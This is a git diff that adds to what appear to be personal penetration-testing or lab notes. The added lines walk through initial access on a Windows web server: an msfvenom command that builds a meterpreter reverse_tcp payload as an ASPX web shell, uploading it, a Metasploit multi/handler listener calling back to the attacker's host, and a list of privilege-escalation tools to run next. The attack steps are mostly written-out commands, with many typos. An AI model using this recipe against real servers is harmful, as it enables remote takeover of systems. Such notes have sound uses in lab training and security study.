@@ -31,4 +31,32 @@ use ffuf => ffuf -u http://ip/FUZZ/nmap.txt -w /usr/share/seclists/Discovery/web
 Now try uploading payload created by msfvenom
 
 msfvenom -l formats
-msfvenom -p windows/x64/meterpreter/reverse_tcp 
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=yourip lport=80,443,53,445(prefer or 80) -f aspx -o robensive.aspx 
+
+now upload robensive.aspx
+
+run metasploit listener
+
+msfdb run 
+uer exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost=yourip
+set lport=445(as used before)
+run
+
+Now access robensive.aspx via browser and get meterpreter
+
+getuid 
+##Completer Initiall Access##
+
+Enumeration for privsec
+->some known scripts:
+PowerUp
+WinPEAS
+PrivescCheck
+BeRoot
+PayloadAllThings
+->Now we can try poetential ways to privilage escalation over the system to be a administrative user
+->Many automation scripts
+
+
